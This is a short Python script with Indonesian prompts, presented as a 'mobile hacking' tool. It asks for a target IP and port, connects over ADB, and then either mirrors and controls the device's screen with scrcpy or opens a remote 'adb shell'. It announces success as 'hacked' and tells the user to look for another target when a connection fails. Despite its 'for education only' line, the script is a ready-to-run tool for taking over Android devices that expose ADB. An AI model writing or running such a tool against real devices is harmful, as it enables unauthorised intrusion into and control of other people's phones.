import os
import time
import subprocess

class fucking:
   def adb(self,host,port):
       print('#############################')
       print('|          SERVER           |')
       print('#############################')
       print('sedang mengaktifkan server!!')
       time.sleep(1)
       os.system('adb start-server')
       print('Server Aktif!!')
       time.sleep(3)
       print('############################')
       print('|       CONNECTIONS        |')
       print('############################')
       print('Mencoba connect dengan target!!')
       time.sleep(3)
       connect = subprocess.run(['adb','connect',f'{host}:{port}'],capture_output=True,text=True)
       if 'connected' in connect.stdout:
           print(f'{host}:{port} target terkoneksi!!')
           time.sleep(3)
           print('###########################')
           print('|     CONTROL SCREEN      |')
           print('###########################')
           control = input('kamu ingin control layar perangkat target? ')
           if control == 'y':
               print('tunggu...')
               time.sleep(5)
               device = subprocess.run(['scrcpy'],capture_output=True,text=True)
               print(device.stdout)
               print('Berhasil di retas')
           else:
               print('masuk ke mode shell!!')
               time.sleep(3)
               os.system('adb shell')
       else:
           print(f'{host}:{port} tidak terkoneksi!!')
           print('silahkan cari target lain!!')
   def hackers(self):
       try:
          print('halo!!')
          time.sleep(1)
          print('program ini di buat hanya untuk edukasi')
          time.sleep(1)
          print('jangan lupa beri bintang di github saya')
          time.sleep(1)
          print('https://github.com/sidabutar1337')
          time.sleep(1)
          print('###############################')
          print('|       MOBILE HACKING        |')
          print('###############################')
          print('|DEVELOPER:ZEUSSEC1337        |')
          print('|GITHUB:SIDABUTAR1337         |')
          print('###############################')
          ip_address = input('input ip target: ')
          port_target = int(input('input port target: '))
          self.adb(ip_address,port_target)
       except ValueError:
          print('value error')
          return self.hackers()
if __name__=='__main__':
    sidabutar = fucking()
    sidabutar.hackers()
